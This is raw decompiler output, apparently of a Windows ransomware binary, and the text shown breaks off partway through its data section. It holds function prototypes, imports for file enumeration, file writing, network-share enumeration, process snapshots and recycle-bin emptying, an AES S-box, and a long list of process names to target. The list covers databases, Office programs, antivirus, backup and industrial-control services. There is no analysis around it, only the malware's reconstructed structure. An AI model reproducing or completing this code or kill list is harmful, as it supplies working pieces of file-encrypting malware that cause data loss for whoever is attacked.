/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
unsigned __int8 *__fastcall sub_401010(_BYTE *a1, _BYTE *a2);
int __fastcall sub_4011C0(unsigned __int8 *a1, int a2);
int __fastcall sub_401410(int a1, int a2);
int __fastcall sub_4015C0(_DWORD *a1, _BYTE *a2);
DWORD __stdcall Function(HANDLE *lpThreadParameter);
LONG sub_401D00();
LPVOID __cdecl sub_401D30(SIZE_T dwBytes);
LPVOID __cdecl sub_401D50(LPVOID lpMem, int a2, SIZE_T dwBytes);
BOOL __cdecl sub_401D70(LPVOID lpMem);
unsigned int __fastcall sub_401D90(int a1, int a2, int a3, int *a4, int a5);
int __fastcall sub_401E30(unsigned int *a1, _DWORD *a2, int a3, unsigned int a4);
int __fastcall sub_401ED0(_DWORD *a1, int a2, int a3, unsigned int a4);
unsigned int __fastcall sub_401F90(unsigned int *a1, char *a2, int a3, unsigned int *a4, int a5);
int __fastcall sub_4020B0(int a1, int a2, int a3, char a4);
int __fastcall sub_402130(_DWORD *a1, _DWORD *a2, int a3, char a4);
unsigned int __fastcall sub_4021A0(unsigned int a1, unsigned int a2);
_DWORD *__fastcall sub_402310(_DWORD *a1, int a2);
_DWORD *__fastcall sub_4023F0(_DWORD *a1, int *a2, int a3);
unsigned int __fastcall sub_4024F0(int a1, char *a2, int a3, int *a4);
int __fastcall sub_402660(char *a1, char *a2, int a3);
unsigned int __fastcall sub_4026F0(int a1, _DWORD *a2, int a3, int a4, int *a5);
int __fastcall sub_402940(int a1, int a2, int a3, unsigned int a4, int a5, int a6, unsigned int a7);
int __fastcall sub_402BD0(int a1, char *a2, int a3, int a4, int a5, int *a6);
LPVOID __fastcall sub_402C80(int *a1, int a2);
int *__fastcall sub_402CD0(int *a1, int *a2);
unsigned int __fastcall sub_402D60(signed int *a1, int a2, int a3);
int __fastcall sub_402E90(int *a1, int a2, int a3);
int __fastcall sub_403000(int *a1, int a2, int a3);
int __fastcall sub_403040(signed int *a1, int a2, int a3);
void __fastcall sub_403080(unsigned int *a1, int a2, int a3);
int __fastcall sub_403170(signed int *a1, int a2, unsigned int a3);
BOOL __fastcall sub_403290(unsigned int *a1, int *a2, int *a3, _DWORD *lpMem);
int __fastcall sub_4034F0(int *a1, int a2, unsigned int a3);
int *__fastcall sub_4035B0(int *a1, _DWORD *a2, int a3, int *a4, int *a5);
BOOL __fastcall sub_403F60(int a1, int *a2, int a3);
_DWORD *__fastcall sub_4040B0(_DWORD *a1, int *a2, int a3, int a4);
unsigned int __fastcall sub_4043D0(int a1, unsigned int a2);
int __fastcall sub_404440(int *a1, unsigned int a2);
int __cdecl sub_404550(int a1, int a2, int a3, int a4, int a5);
char *__cdecl sub_404630(int a1, int a2, int a3, int a4, int a5);
bool __thiscall sub_4046E0(void *this);
DWORD __stdcall sub_404970(LPVOID lpThreadParameter); // idb
void __stdcall sub_404B60(WCHAR *lpString2);
int __stdcall sub_404D30(LPNETRESOURCEW lpNetResource); // idb
LONG sub_404E00();
int __fastcall sub_404E30(int a1, int a2, unsigned int a3);
int __fastcall sub_405140(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7);
char __fastcall sub_405370(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7);
char __stdcall sub_4053D0(int a1, int a2);
int __stdcall sub_4055E0(int a1, int a2, int a3, __int128 a4, __int64 a5);
void *sub_405790();
HRESULT sub_4057A0();
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void **__thiscall sub_405F50(void **this, void *Src, unsigned int a3);
void __noreturn sub_406090(void); // weak
// void *__cdecl operator new(size_t Size); idb
void __cdecl sub_4060CB(void *Block);
// _DWORD __cdecl _Init_thread_footer(_DWORD); weak
// _DWORD __cdecl _Init_thread_header(_DWORD); weak
void __cdecl j_j_j___free_base(void *Block);
// int __cdecl atexit(void (__cdecl *)());
// int __cdecl unknown_libname_2(_DWORD); weak
int sub_406690();
int sub_406698();
std::exception *__thiscall sub_406826(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_406841(_DWORD *this);
std::exception *__thiscall sub_406859(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_406874(_DWORD *this);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); idb
void __noreturn sub_4068F6(); // weak
void __noreturn sub_406913(); // weak
void __cdecl j_j___free_base(void *Block);
int __cdecl UserMathErrorFunction();
LPTOP_LEVEL_EXCEPTION_FILTER sub_406AD7();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_406B24();
int sub_406CD7();
void sub_406DEB();
char sub_406DF7();
void *sub_406E1B();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_406E3E();
void *sub_406E4A();
void *sub_406E50();
void sub_406E56();
void __cdecl sub_406E82(); // idb
_DWORD *__thiscall sub_406EAE(_DWORD *Block, char a2);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const); idb
std::exception *__thiscall sub_40702B(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_407046(std::exception *this, char *a2);
std::exception *__thiscall sub_407067(std::exception *this, struct std::exception *a2);
void __cdecl __noreturn sub_407082(char *a1); // idb
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memset(void *, int Val, size_t Size);
std::exception *__thiscall sub_407A3C(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_407A57(_DWORD *this);
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// int __cdecl rand();
// _DWORD __stdcall unknown_libname_7(_DWORD); weak
int __cdecl sub_409B64(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// void *__cdecl malloc(size_t Size);
int __cdecl sub_409C5E(int a1);
int __cdecl sub_40A0B5(int a1);
// int __cdecl unknown_libname_9(void *Block); idb
void *__cdecl sub_40A5D8(void **a1);
void *__cdecl sub_40A5F3(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40A6EC(int a1, int a2);
int __cdecl sub_40A714(int a1, int a2);
int __cdecl sub_40A99D(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_40AA31();
char sub_40AA5D();
__vcrt_bool sub_40AAA2();
int sub_40AB46();
int __cdecl sub_40AB4C(int a1);
int __cdecl sub_40AB74(int a1);
__int32 sub_40AD17();
int sub_40ADD6();
// int __cdecl _set_new_mode(int NewMode);
void *sub_40AE0B();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
int sub_40BB3A();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40BD85(int a1, int a2);
int __cdecl sub_40BDAD(int a1, int a2);
int __cdecl sub_40BDD5(int a1, int a2);
int __cdecl sub_40BDFD(int a1, int a2);
struct __crt_locale_data *__cdecl sub_40C102(int a1, struct __crt_locale_data **a2);
void *__cdecl sub_40C12F(int a1, void **a2);
// void __cdecl _free_base(void *Block);
int __thiscall sub_40CE65(_DWORD **this, void *Block);
// int unknown_libname_14(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40CF6F(int a1, int a2);
// int __acrt_update_thread_multibyte_data(void); weak
char *__cdecl sub_40D87C(void *Block, unsigned int a2, unsigned int a3);
char sub_40D905();
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40DA39(int a1, int a2);
// int __acrt_update_thread_locale_data(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40EDFB(int a1, int a2);
// size_t __cdecl _msize(void *Block);
// void *__cdecl _realloc_base(void *Block, size_t Size);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40FE4F(int a1, int a2);
int __cdecl sub_40FE77(int a1);
int sub_40FFCD();
// void __usercall sub_410264(char a1@<ch>, int a2@<ebp>);
// int _ffexpm1(void); weak
// int isintTOS(void); weak
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
void __cdecl sub_411F70(); // idb

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern DWORD (__stdcall *GetLastError)();
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern DWORD (__stdcall *GetTickCount)();
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LONG (__stdcall *InterlockedExchangeAdd)(volatile LONG *Addend, LONG Value);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *QueueUserWorkItem)(LPTHREAD_START_ROUTINE Function, PVOID Context, ULONG Flags);
// extern LPWSTR (__stdcall *lstrcpynW)(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern DWORD (__stdcall *WNetEnumResourceW)(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// extern DWORD (__stdcall *WNetCloseEnum)(HANDLE hEnum);
// extern DWORD (__stdcall *WNetOpenEnumW)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
// extern HRESULT (__stdcall *SHEmptyRecycleBinA)(HWND hwnd, LPCSTR pszRootPath, DWORD dwFlags);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern LPWSTR (__stdcall *PathRemoveBackslashW)(LPWSTR pszPath);
// extern PWSTR (__stdcall *StrStrW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern PWSTR (__stdcall *StrRStrIW)(PCWSTR pszSource, PCWSTR pszLast, PCWSTR pszSrch);
// extern PWSTR (__stdcall *StrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern int (*wnsprintfA)(PSTR pszDest, int cchDest, PCSTR pszFmt, ...);
// extern int (*wnsprintfW)(PWSTR pszDest, int cchDest, PCWSTR pszFmt, ...);
// extern LPWSTR (__stdcall *CharLowerW)(LPWSTR lpsz);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern HRESULT (__stdcall *CoSetProxyBlanket)(IUnknown *pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR *pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
void *std::bad_alloc::`vftable' = &unknown_libname_4; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_4; // weak
void *type_info::`vftable' = &sub_406EAE; // weak
void *std::logic_error::`vftable' = &unknown_libname_4; // weak
void *std::length_error::`vftable' = &unknown_libname_4; // weak
const IID stru_4123DC = { 3692209799u, 29567u, 4559u, { 136u, 77u, 0u, 170u, 0u, 75u, 46u, 36u } }; // idb
const IID riid = { 1152165492u, 59644u, 4560u, { 160u, 124u, 0u, 192u, 79u, 182u, 136u, 32u } }; // idb
const IID stru_4124AC = { 1167128593u, 7482u, 4560u, { 137u, 31u, 0u, 170u, 0u, 75u, 46u, 36u } }; // idb
const IID rclsid = { 1732994712u, 61074u, 4560u, { 173u, 113u, 0u, 192u, 79u, 216u, 253u, 255u } }; // idb
void *std::bad_exception::`vftable' = &unknown_libname_4; // weak
char RijnDael_AES_LONG_416E18[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '€',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
char byte_417018[16] =
{
  '\x8D',
  '\x01',
  '\x02',
  '\x04',
  '\b',
  '\x10',
  ' ',
  '@',
  '€',
  '\x1B',
  '6',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
int dword_417028[] = { 0 }; // weak
int dword_417428 = 1116352408; // weak
wchar_t *off_417538[1687] =
{
  L"vmwp.exe",
  L"calc.exe",
  L"calculator.exe",
  L"ccflic0.exe",
  L"ccenter.exe",
  L"ccflic4.exe",
  L"ravxp.exe",
  L"healthservice.exe",
  L"rfwproxy.exe",
  L"ilicensesvc.exe",
  L"rfwstub.exe",
  L"nimbus.exe",
  L"knownsvr.exe",
  L"prlicensemgr.exe",
  L"ras.exe",
  L"certificateprovider.exe",
  L"rasupd.exe",
  L"proficypublisherservice.exe",
  L"upfile.exe",
  L"proficysts.exe",
  L"rstray.exe",
  L"erlsrv.exe",
  L"ravalert.exe",
  L"vmtoolsd.exe",
  L"rav.exe",
  L"managementagenthost.exe",
  L"ravmond.exe",
  L"vgauthservice.exe",
  L"ravmon.exe",
  L"epmd.exe",
  L"ravservice.exe",
  L"hasplmv.exe",
  L"ravstub.exe",
  L"spooler.exe",
  L"ravtask.exe",
  L"hdb.exe",
  L"ravtray.exe",
  L"ntservices.exe",
  L"ravupdate.exe",
  L"n.exe",
  L"rnreport.exe",
  L"monitoringhost.exe",
  L"rsnetsvr.exe",
  L"win32sysinfo.exe",
  L"scanfrm.exe",
  L"inet_gethost.exe",
  L"rfwmain.exe",
  L"taskhostw.exe",
  L"rfwsrv.exe",
  L"proficy administrator.exe",
  L"winlog.exe",
  L"ntevl.exe",
  L"omslogmanager.exe",
  L"prproficymgr.exe",
  L"snhwsrv.exe",
  L"prrds.exe",
  L"snicheckadm.exe",
  L"prrouter.exe",
  L"snichecksrv.exe",
  L"prconfigmgr.exe",
  L"snicon.exe",
  L"prgateway.exe",
  L"snsrv.exe",
  L"premailengine.exe",
  L"smsx.exe",
  L"pralarmmgr.exe",
  L"svcharge.exe",
  L"prftpengine.exe",
  L"svdealer.exe",
  L"prcalculationmgr.exe",
  L"svframe.exe",
  L"prprintserver.exe",
  L"svtray.exe",
  L"prdatabasemgr.exe",
  L"sschk.exe",
  L"preventmgr.exe",
  L"trjscan.exe",
  L"prreader.exe",
  L"trupd.exe",
  L"prwriter.exe",
  L"ssecuritymanager.exe",
  L"prsummarymgr.exe",
  L"dltray.exe",
  L"prstubber.exe",
  L"dlservice.exe",
  L"prschedulemgr.exe",
  L"almon.exe",
  L"cdm.exe",
  L"lmon.exe",
  L"musnotificationux.exe",
  L"savadminservice.exe",
  L"npmdagent.exe",
  L"savservice.exe",
  L"client64.exe",
  L"sweepsrv.sys",
  L"keysvc.exe",
  L"swnetsup.exe",
  L"server_eventlog.exe",
  L"alsvc.exe",
  L"proficyserver.exe",
  L"alupdate.exe",
  L"server_runtime.exe",
  L"savmain.exe",
  L"config_api_service.exe",
  L"sav32cli.exe",
  L"fnplicensingservice.exe",
  L"certificationmanagerservicent.exe",
  L"workflowresttest.exe",
  L"emlibupdateagentnt.exe",
  L"proficyclient.exe",
  L"managementagentnt.exe",
  L"vmacthlp.exe",
  L"mgntsvc.exe",
  L"msdtssrvr.exe",
  L"routernt.exe",
  L"sqlservr.exe",
  L"schdsrvc.exe",
  L"msmdsrv.exe",
  L"scfmanager.exe",
  L"reportingservicesservice.exe",
  L"scfservice.exe",
  L"dsmcsvc.exe",
  L"scftray.exe",
  L"winvnc4.exe",
  L"op_viewer.exe",
  L"client.exe",
  L"sgbhp.exe",
  L"collwrap.exe",
  L"pctsauxs.exe",
  L"bluestripecollector.exe",
  L"pctsgui.exe",
  L"sqlbrowser.exe",
  L"pctssvc.exe",
  L"dsmcad.exe",
  L"pctstray.exe",
  L"nimcluster.exe",
  L"regmech.exe",
  L"googleupdate.exe",
  L"sdtrayapp.exe",
  L"smc.exe",
  L"svcntaux.exe",
  L"bcrservice.exe",
  L"swdsvc.exe",
  L"dbsrv9.exe",
  L"swnxt.exe",
  L"rtvscan.exe",
  L"execstat.exe",
  L"bcreporter.exe",
  L"seestat.exe",
  L"csadmin.exe",
  L"swserver.exe",
  L"csdbsync.exe",
  L"slee81.exe",
  L"csmon.exe",
  L"kpf4gui.exe",
  L"csauth.exe",
  L"kpf4ss.exe",
  L"cslog.exe",
  L"wrspysetup.exe",
  L"csradius.exe",
  L"acctmgr.exe",
  L"cstacacs.exe",
  L"alertsvc.exe",
  L"url_response.exe",
  L"alunotify.exe",
  L"vmware-converter-a.exe",
  L"aluschedulersvc.exe",
  L"vmware-converter.exe",
  L"appsvc32.exe",
  L"avagent.exe",
  L"ccap.exe",
  L"paxton.net2.clientservice.exe",
  L"ccapp.exe",
  L"paxton.net2.commsserverservice.exe",
  L"ccevtmgr.exe",
  L"avscc.exe",
  L"ccproxy.exe",
  L"prunsrv.exe",
  L"ccpxysvc.exe",
  L"googlecrashhandler.exe",
  L"ccsetmgr.exe",
  L"googlecrashhandler64.exe",
  L"checkup.exe",
  L"vmwaretray.exe",
  L"cka.exe",
  L"nd2svc.exe",
  L"comhost.exe",
  L"tnslsnr.exe",
  L"cpdclnt.exe",
  L"omtsreco.exe",
  L"csinject.exe",
  L"oracle.exe",
  L"csinsm32.exe",
  L"patrolagent.exe",
  L"csinsmnt.exe",
  L"scfagent_64.exe",
  L"dbserv.exe",
  L"patrolperf.exe",
  L"defwatch.exe",
  L"rscdsvc.exe",
  L"defwatch",
  L"rscd.exe",
  L"diskmon.exe",
  L"pmgreader.exe",
  L"djsnetcn.exe",
  L"firefox.exe",
  L"doscan.exe",
  L"chrome.exe",
  L"dwhwizrd.exe",
  L"netsession_win.exe",
  L"fwcfg.exe",
  L"pcsws.exe",
  L"ghost_2.exe",
  L"pcscm.exe",
  L"ghosttray.exe",
  L"cwbunnav.exe",
  L"icepack.exe",
  L"rdrcef.exe",
  L"idsinst.exe",
  L"ndrvx.exe",
  L"ispwdsvc.exe",
  L"ndrvs.exe",
  L"issvc.exe",
  L"dr_serviceengine.exe",
  L"isuac.exe",
  L"teamviewer_service.exe",
  L"luall.exe",
  L"sqlagent.exe",
  L"lucallbackproxy.exe",
  L"dwrcst.exe",
  L"lucoms~1.exe",
  L"ccm messaging.exe",
  L"lucoms.exe",
  L"zoolz.exe",
  L"mcui32.exe",
  L"agntsvc.exe",
  L"navapsvc.exe",
  L"dbeng50.exe",
  L"navapw32.exe",
  L"dbsnmp.exe",
  L"navectrl.exe",
  L"encsvc.exe",
  L"navelog.exe",
  L"excel.exe",
  L"navesp.exe",
  L"firefoxconfig.exe",
  L"navshcom.exe",
  L"infopath.exe",
  L"navw32.exe",
  L"isqlplussvc.exe",
  L"navwnt.exe",
  L"msaccess.exe",
  L"ndetect.exe",
  L"msftesql.exe",
  L"ngctw32.exe",
  L"mspub.exe",
  L"ngserver.exe",
